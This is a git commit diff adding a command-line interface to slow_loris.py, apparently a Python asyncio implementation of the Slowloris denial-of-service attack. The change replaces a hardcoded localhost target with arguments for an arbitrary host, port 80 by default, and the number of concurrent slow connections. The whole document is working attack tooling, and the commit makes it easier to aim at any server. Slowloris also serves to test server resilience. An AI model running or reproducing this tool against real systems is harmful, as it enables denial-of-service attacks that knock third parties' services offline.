8b2d27079d379f9bb8793e61dda49959c47f3dce
wpbindt <wesselbindt@gmail.com>
2021-04-30 14:57:33 +0200

    Add command line interface for slow loris

--- slow_loris.py
+++ slow_loris.py
@@ -1,3 +1,4 @@
+from argparse import ArgumentParser
 import asyncio
 from functools import partial
 import random
@@ -20,16 +21,28 @@ async def slow_loris(address, random_sleep):
         await server.drain()
 
 
-async def main(address):
+async def main(address, loris_count):
     lorises = [
         asyncio.create_task(
             slow_loris(address, partial(random.gauss, mu=1, sigma=0.5))
         )
-        for _ in range(4)
+        for _ in range(loris_count)
     ]
     await asyncio.gather(*lorises)
 
 
 if __name__ == '__main__':
-    address = ('127.0.0.1', 1060)
-    asyncio.run(main(address))
+    parser = ArgumentParser()
+    parser.add_argument('host', nargs='?', default='127.0.0.1')
+    parser.add_argument('-p', dest='port', type=int, default=80)
+    parser.add_argument(
+        '-N',
+        dest='loris_count',
+        type=int,
+        default=4,
+        help='Number of lorises to connect to the server',
+    )
+    args = parser.parse_args()
+
+    address = (args.host, args.port)
+    asyncio.run(main(address, args.loris_count))
